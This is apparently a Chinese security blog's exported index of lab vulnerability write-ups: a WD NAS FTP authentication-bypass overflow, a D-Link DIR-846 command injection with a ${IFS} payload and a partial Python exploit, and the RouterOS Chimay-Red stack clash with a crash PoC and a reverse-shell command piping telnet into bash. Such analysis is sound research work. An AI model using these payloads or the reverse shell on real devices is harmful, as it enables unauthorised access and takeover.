通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。\n而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：\n这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。\n那么为什么要覆盖着loggedin呢？\n其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：\n动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：\n但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。\n故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent\n其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。\n接下来我们实际操作一下。\n首先用gdbserver挂起程序：\n别问为啥本地也要用gdbserver，问就是gdbserver用习惯了，脑子没转过来\n随后用gdb连接上：\ngdb连上后会断在*_start函数，这里我们直接把断点打在accept_client函数和douser*函数上\n然后c，看到程序会卡住，这里程序是进入了select函数，需要我们进行连接：\n$ python3\r\u0026gt;\u0026gt;\u0026gt; from ftplib import FTP\r\u0026gt;\u0026gt;\u0026gt; ftp = FTP(\u0026#39;0.0.0.0\u0026#39;) 随后函数就会在断点1处停下来，这时我们设定follow-fork-mode为parent\n然后继续c，这时候程序又会被阻塞，需要我们在ftp中输入命令：\n\u0026gt;\u0026gt;\u0026gt; ftp.login(\u0026#39;a\u0026#39;*2146) 我们就可以成功进入douser函数了：\n随后我们来到漏洞点的strncpy函数：\n这时我们先看看loggedin变量的值：\n可以看到现在为0，然后我们步过strncpy函数：\n这时loggedin的值已经被覆盖了。\n漏洞复现 刚刚我们对漏洞进行了分析，现在我们总体来看一遍漏洞的效果：\n首先直接启动pure-ftpd，然后利用python进行访问：\n$ python3\r\u0026gt;\u0026gt;\u0026gt; from ftplib import FTP\r\u0026gt;\u0026gt;\u0026gt; ftp = FTP(\u0026#39;0.0.0.0\u0026#39;) 接下来我们需要执行一个在没有授权时，不能执行的操作：\n\u0026gt;\u0026gt;\u0026gt; ftp.pwd() 看到回复，说明没有登录。接下来对权限进行绕过：\n这里已经提示，我们已经登录过了。\n然后再次执行需要授权的操作：\n\u0026gt;\u0026gt;\u0026gt; ftp.pwd() 这时不再提示需要登录而是直接返回工作路径了。\nrce rce需要设备环境，但现在没有设备，大概思路为更改工作路径，上传马，但是设备的环境和自己的环境是有差距的，所以想要rce就需要买设备。没钱\n","permalink":"http://jellyfish-pro.github.io/vuln/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。\n环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。\n因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。\n当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录\n执行下面的命令将pure-ftpd修改为西数的版本：\ntar xf pure-ftpd_1.0.47.orig.tar.gz\rcd pure-ftpd-1.0.47.orig\rfor patch_name in `ls ../patch`; do echo \u0026#34;--\u0026gt;patch name=$patch_name\u0026#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。\n解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。\n根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。\n但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：\n这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。\nbin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。\n刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：\n这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录\n而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：\n可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。\n将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init\n**注意：**这里的路径是已经被挂载后的路径。\n这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。\n启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。\n虽然环境不能启动，但是我们可以直接启动ftp服务呀。\n我们可以直接启动ftp服务：\n漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。\n而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：\n这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。\n那么为什么要覆盖着loggedin呢？\n其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：\n动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：\n但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。\n故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent\n其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。","title":""},{"content":"CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。\n那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。\nqemu-system 启动成功 因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。\n首先我们需要为qemu-system搭建一个网桥：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 查看ifconfig可以看到已经配置成功：\n然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（下载（×），找师兄白嫖（√））：\n接下来使用命令开启qemu-system:\nsudo qemu-system-mipsel -M malta -m 512 \\\r-kernel vmlinux-3.2.0-4-4kc-malta-x86 \\\r-hda debian_wheezy_mipsel_standard.qcow2 \\\r-append \u0026#34;root=/dev/sda1 console=ttyS0\u0026#34; \\\r-net nic,macaddr=00:19:3e:00:00:01 -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no -kernel：选择内核版本，这里选择lighttpd符合的版本\n-hda：选择硬盘文件\n-nographic：不适用GUI图形界面\n-net nic -net tap,ifname=tap0,script=no,downscript=no：选择桥接模式，使用刚刚我们创建的网卡\n启动成功后，给qemu-system分配ip：\nifconfig eth0 \u0026lt;your-ip\u0026gt; 然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）\n随后解压，挂载debian系统的/proc和/dev：\nmount --bind /proc ./proc\rmount --bind /dev ./dev\rchroot . /bin/bash 最后启动服务：\n**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了\n./etc/init.d/php7-fastcgi start\r./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf 漏洞复现 **注：**该漏洞需要登陆获取cookie\n首先我们来到路由器登陆界面开启抓包：\n输入密码后看到抓包：\n这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie\n将这个cookie复制到poc上，就可以执行命令了：\n{\u0026#34;SetIpMacBindSettings\u0026#34;:{\u0026#34;lan_unit\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;lan(0)_dhcps_staticlist\u0026#34;:\u0026#34;1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9\u0026#34;}} 这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。符合黑客低调的行事风格（雾）\n复现结果如下\n漏洞点代码分析 根据git上的poc我们可以看到，该漏洞是存在于 /www/HNAP1/control/SetIpMacBindSettings.php文件中\n对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.\n大概的流程为：\n#SetIpMacBindSettings.php:35\r$staticlist = explode(\u0026#34;;\u0026#34;, $option[\u0026#39;lan(0)_dhcps_staticlist\u0026#39;]); 这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：\n随后，进入循环，将值赋给 $val：\n#SetIpMacBindSettings.php:74\rforeach ($staticlist as $val) 接下来，代码会将我们输入的值根据 “,”分割：\n#SetIpMacBindSettings.php:75\r$vl_arr = explode(\u0026#34;,\u0026#34;, $val); 所以我们的命令存放在 $val[1]中，\n最后跟随着另外的命令一起执行：\n#SetIpMacBindSettings.php:80\rexec(\u0026#34;changename.sh \u0026#34; . $vl_arr[2] . \u0026#34; \u0026#34; . $vl_arr[1]); 当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。\n例如如下代码：\n#SetIpMacBindSettings.php:54\r$special_char_arr = array(\u0026#34;\\\u0026#39;\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;);\rif (contains_special_char($vl_arr[1], $special_char_arr)) {\r$result[\u0026#34;message\u0026#34;] = \u0026#34;specil character.\u0026#34;;\r$this-\u0026gt;api_response(__CLASS__, $result);\r}\r#HNAP1/core/fun/public.php:420\rfunction contains_special_char($str, $special_char_arr)\r{\rfor ($i = 0; $i \u0026lt; count($special_char_arr); $i++) {\rif (strpos($str, $special_char_arr[$i]) !== false) {\rreturn true;\r}\r}\rreturn false;\r} 可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 contains_special_char函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。\n但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 ${IFS} \\t等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。\nexp编写 通过上面的漏洞复现，我们可以知道exp需要经历的流程：\n第一次登陆——》第二次登陆——》获取cookie——》发送命令 那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？\n通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：\n这是第一次登陆发送的包头，而返回的包头中多出来了一个Set-Cookie的字段：\n然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：\n同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：\n这里可以看到uid是直接把返回包的cookie字段复制过去了，但是privatekey是怎么得到的呢？\n我们只能又去找源码了。\n因为我们是通过login.html点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：\n#/www/login.html:404\r\u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;\u0026#34; id=\u0026#34;logIn_btn\u0026#34; class=\u0026#34;styled_button_long\u0026#34; onClick=\u0026#34;OnClickLogin();\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; 通过这个onClinck事件，我们可以追朔到 \\www\\Login.html:243\n这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：\n#\\www\\Login.html:244\rvar Login_Password = document.getElementById(\u0026#34;admin_Password1\u0026#34;).value;\rvar Login_Captcha = \u0026#34;\u0026#34;;\rdocument.getElementById(\u0026#34;logIn_btn\u0026#34;).disabled = true;\rdocument.getElementById(\u0026#34;error_1\u0026#34;).style.display = \u0026#34;none\u0026#34;;\rdoLogin(Login_Password, Login_Captcha) 这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 doLogin()的函数。\n根据经验，我们可以猜测，这个函数里就是处理密码的地方 根据经验（×），这么大一个login就写在上面（√）\n通过寻找，我们追寻到了 \\www\\js\\Login.js\n在这里我们就可以看到上面privatekey的来历了：\n#\\www\\js\\Login.js:16\rPrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);\rPrivateKey = PrivateKey.toUpperCase();\t//将PrivateKey全改为大写 这个 ifLogin_Password 就是咱们传进来的密码\n现在我们知道这个privatekey是怎么来的了。\n但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：\n#\\www\\js\\Login.js:28\r$.cookie(\u0026#39;PrivateKey\u0026#39;, PrivateKey, {path: \u0026#39;/\u0026#39;});\rvar Login_Passwd = md5(PrivateKey + obj.Challenge);\rLogin_Passwd = Login_Passwd.toUpperCase(); 到这里，整个密码的加密过程就完整了：\n先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge） 所以我们的exp:\n#将所有数据设定好\rurl = \u0026#34;\u0026#34;\rcookie = \u0026#34;\u0026#34;\rpasswd = \u0026#39;12345678\u0026#39;\rhead = {\r\u0026#39;Host\u0026#39;: \u0026#39;192.168.52.128:8080\u0026#39;,\r\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\u0026#39;,\r\u0026#39;Accept\u0026#39;: \u0026#39;application/json, text/javascript, */*; q=0.01\u0026#39;,\r\u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39;,\r\u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;,\r\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json; charset=utf-8\u0026#39;,\r\u0026#39;SOAPAction\u0026#39;: \u0026#39;\u0026#34;http://purenetworks.com/HNAP1/Login\u0026#34;\u0026#39;,\r\u0026#39;HNAP_AUTH\u0026#39;: \u0026#39;E5C14446F7156A0DE9E56D8ED83DAA45 1673393304539\u0026#39;,\r\u0026#39;X-Requested-With\u0026#39;: \u0026#39;XMLHttpRequest\u0026#39;,\r\u0026#39;Content-Length\u0026#39;: \u0026#39;128\u0026#39;,\r\u0026#39;Origin\u0026#39;: \u0026#39;http://192.168.52.128:8080\u0026#39;,\r\u0026#39;Connection\u0026#39;: \u0026#39;close\u0026#39;,\r\u0026#39;Referer\u0026#39;: \u0026#39;http://192.168.52.128:8080/Login.html?t=1673247593914\u0026#39;,\r}\rdata1 = {\u0026#34;Login\u0026#34;:{\u0026#34;Action\u0026#34;:\u0026#34;request\u0026#34;,\u0026#34;Username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;LoginPassword\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Captcha\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;PrivateLogin\u0026#34;:\u0026#34;LoginPassword\u0026#34;}}\rdata2 = {\r\u0026#34;Login\u0026#34;:\r{\r\u0026#34;Action\u0026#34;:\u0026#34;login\u0026#34;,\r\u0026#34;Username\u0026#34;:\u0026#34;admin\u0026#34;,\r\u0026#34;LoginPassword\u0026#34;:\u0026#34;\u0026#34;,\r\u0026#34;Captcha\u0026#34;:\u0026#34;\u0026#34;,\r\u0026#34;PrivateLogin\u0026#34;:\u0026#34;LoginPassword\u0026#34;\r}\r}\rdata3 = {\r\u0026#34;SetIpMacBindSettings\u0026#34;:\r{\r\u0026#34;lan_unit\u0026#34;:\u0026#34;0\u0026#34;,\r\u0026#34;lan(0)_dhcps_staticlist\u0026#34;:\u0026#34;\u0026#34;\r}\r} #第一次登陆，返回PHPSESSID, challenge, uid, PublicKey\rdef login_1():\rret = requests.post(url, headers=head, data=json.dumps(data1))\rPHPSESSID = ret.headers[\u0026#39;Set-Cookie\u0026#39;][:-8]\rresponse_challenge = ret.text.find(\u0026#34;Challenge\u0026#34;)\rresponse_cookie = ret.text.find(\u0026#34;Cookie\u0026#34;)\rresponse_publickey = ret.text.find(\u0026#34;\\\u0026#34;,\\\u0026#34;PublicKey\u0026#34;)\rresponse_end = ret.text.find(\u0026#34;\\\u0026#34;}}\u0026#34;)\rchallenge = ret.text[response_challenge+12:response_cookie-3]\ruid = ret.text[response_cookie+9:response_publickey]\rPublicKey = ret.text[response_publickey+15:response_end]\r# ex(ret.text, challenge, uid, PublicKey)\rif not PHPSESSID:\rex(\u0026#34;PHPSESSID empty\u0026#34;)\rif not challenge:\rex(\u0026#34;challenge empty\u0026#34;)\rif not uid:\rex(\u0026#34;uid empty\u0026#34;)\rif not PublicKey:\rex(\u0026#34;PublicKey empty\u0026#34;)\rreturn PHPSESSID, challenge, uid, PublicKey #将cookie拼接好，并且对密码进行加密\rcookie += PHPSESSID + \u0026#39;;uid=\u0026#39; + uid + \u0026#39;;privetakey=\u0026#39; +privetakey\rlogin_passwd, privetakey = MD5(PublicKey, passwd, challenge)\rdef MD5(public :str, passwd :str, challenge :str):\rh1 = hashlib.md5()\rh2 = hashlib.md5()\rh1.update((public + passwd + challenge).encode())\rprivatekey = h1.hexdigest()\r# ex(privatekey.upper())\rh2.update((privatekey.upper() + challenge).encode())\rreturn h2.hexdigest(), privatekey.upper() #然后进行第二次登陆\rdef login_2(cookie, loginpassword):\rdata2[\u0026#39;Login\u0026#39;][\u0026#39;LoginPassword\u0026#39;] = loginpassword\rhead[\u0026#39;Cookie\u0026#39;] = cookie\rret = requests.post(url, headers=head, data=json.dumps(data2)) #第二次发包后，该cookie就可以进行命令注入了，故构造命令注入的数据包\rdef login_3(cmd):\rdata3[\u0026#34;SetIpMacBindSettings\u0026#34;][\u0026#39;lan(0)_dhcps_staticlist\u0026#39;] = cmd\rret = requests.post(url, headers=head, data=json.dumps(data3))\r# ex(ret.text)\rif \u0026#34;OK\u0026#34; not in ret.text:\rex(\u0026#34;vuln use false\u0026#34;) ","permalink":"http://jellyfish-pro.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。","title":""},{"content":"RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。\n漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。\n首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像\n这里我选择的是 RouterOS 6.38.4\n然后使用VMware模拟，这里我们指出几个需要注意的点：\n这里可以选择Linux 3.x 内核。\n随后创建完成虚拟机后，需要修改虚拟机配置：\n这里需要将 硬盘(SCSI)改为IDE\n随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入'a'选择所有，然后输入'i'进行安装，然后根据提示一直按 'y'就可以：\n安装好后使用 admin：''登录RouterOS。\n然后输入setup命令，根据提示设置ip地址\n最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。\nRouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。\n这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。\n使用方法也很简单：\n#git clone https://github.com/0ki/mikrotik-tools.git\r#cd mikrotik-tools\r#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。\n**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。\n出现截图中的语句则表示越狱成功。\n接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:'')\nRouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.\n**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)\n首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：\n#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：\n#nc -lnvp 8080 然后使用exp，执行命令：\n#./StackClash_x86.py 192.168.113.129 80 www_binary \u0026#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1\u0026#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。\n在 Request::readPostData函数里，我们可以看到漏洞点：\n通过伪代码和函数的名称，我们可以大概了解到这是一个处理post请求的函数，大概的流程为，处理请求头的 content-length字段，然后使用 alloca函数分配内存，随后利用read函数将post请求的数据读入分配好的内存中。\n粗略的看上去，这段代码似乎并没有问题，但是当我们将请求头的 content-length字段设置为一个十分大的数时，就可以看到该漏洞的效果。(-1非常大)(大嘘)\n#poc.py\rimport socket\rdef makeHeader(num):\rstring = f\u0026#34;POST /jsproxy HTTP/1.1\\r\\nContent-Length: {num}\\r\\n\\r\\n\u0026#34;\rreturn string.encode()\rhead = makeHeader(-1)\rs1 = socket.socket()\rs1.connect((\u0026#34;192.168.113.129\u0026#34;, 80))\rs1.send(head)\rs1.send(b\u0026#39;A\u0026#39;*0x10)\rs1.close() 我们把断点打在alloca()前：\n（这里只是用ida表示断点打在那，调试还是用的gdb）\n通过这里的汇编我们可以看到alloca函数并没有使用call指令，而是直接使用的sub esp,eax命令，来实现分配栈的操作。\n我们将poc发送过去，gdb断在了断点处，我们一步步往下走\n0x8055a53：将我们传过去的数字放入edx， 0x8055a56：edx+0x10，放入eax。因为edx已经为最大数了，故edx+0x10=0xf。 0x8055a59：这里的命令的意思相当于是将eax的最低位数变为0。 0x8055a5c：这里就是漏洞点了，这里将esp减去eax，可是eax为0.故esp不变。 到这里漏洞已经触发了，只是我们看不到任何的效果。我们需要将程序运行到下面的read函数，才可以看到明显的效果：\n通过栈，我们可以看到read函数的参数。参数显示read函数会读取0xffffffff个字节到0x774cb180（就是上面esp所指的地址）。\n这下漏洞就很明显了，我们要读取0xfffffff个字节，但是alloca函数并没有分配栈来读取这0xfffffff个字节（也可以说是分配了0个字节的栈），这时read函数并不知道alloca函数没有分配栈，故把所有字节都写入了0x774cb180处，于是程序原本的栈结构就被破坏了。显示Segmentation fault\n**注：**这里需要额外注意，根据x86传参规律，我们可以判断地址0x774cb17c上面的为参数。那么read的返回值则会放到0x774cb16c的位置。换言之就是read函数返回值会被放在（写入地址-0x14）的位置。这里很重要，因为下面漏洞利用时会涉及到ret偏移量的计算。\n漏洞利用 从上面使用的exp，我们可以大概猜到利用方式是使用的线程同步。\n通过观察exp和调试，利用方法大概为：\n第一步：创建两个线程，t1，t2。\n第二步：利用alloca函数将t1的栈顶抬至t2的栈里\n第三步：触发t2中的read函数，让其将ret放入栈中\n第四步：触发t1的read函数，读取数据，覆盖t2的ret\n第五步：关闭t2，触发read函数ret，实现程序流控制\n前提准备 因为我们需要将第一个线程的数据写进第二个线程，所以我们要保证两个线程的内存是挨在一起的，那么要怎么样才能做到这一点呢？很简单的办法就是重新创建一个新的进程，在新的进程中创建两个线程。\n由于ROS有着服务自动重启的机制，所以我们可以使用上面所说的传给alloca函数一个很大的数字，从而让当前的www服务崩溃，随后ROS重启www服务，这时在这个全新的www中创建两个线程，那么两个线程的内存块就连在一起了：\n我们执行上面的exp，然受使用IDA远程调试：\n**注：**需要先将gdbserver放入ROS，可以通过wget命令，也可以在浏览器上访问路由管理页面直接上传文件。这里选择IDA调试而不选择GDB的原因是对于多进程调试，IDA比GDB更方便一些\n然后使用IDA连接（记得先打上断点）：\n随后发送exp，看到到达断点位置：\n看到这里只新建了一个线程，这个线程就是要被我们弄崩溃的那个线程。我们继续单步往下：\n步过read函数后可以看到两个新的线程被创建，我们去看看这两个线程的栈顶：\n，然后我们去看看堆栈情况：\n两个线程分别位于这两个内存块中（0x77d36000-0x77d55000和0x77d16000-0x77d35000），中间有一块0x1000的缓冲带 ，那么很明显，两个线程的内存挨在一起了。\n第一步 第一步是创建两个线程，其实上面我们也体现了，杀掉第一个线程，创建两个新线程，所以这里我们就不调试了，直接分析exp的代码：\n首先程序先将原本的进程弄崩溃：\ndef crash(ip, port):\rprint(\u0026#34;Crash...\u0026#34;)\rs = makeSocket(ip, port)\rsocketSend(s, makeHeader(-1))#发送-1，\rsocketSend(s, b\u0026#39;A\u0026#39; * 0x1000)\rs.close()\rtime.sleep(2.5) # www takes up to 3 seconds to restart 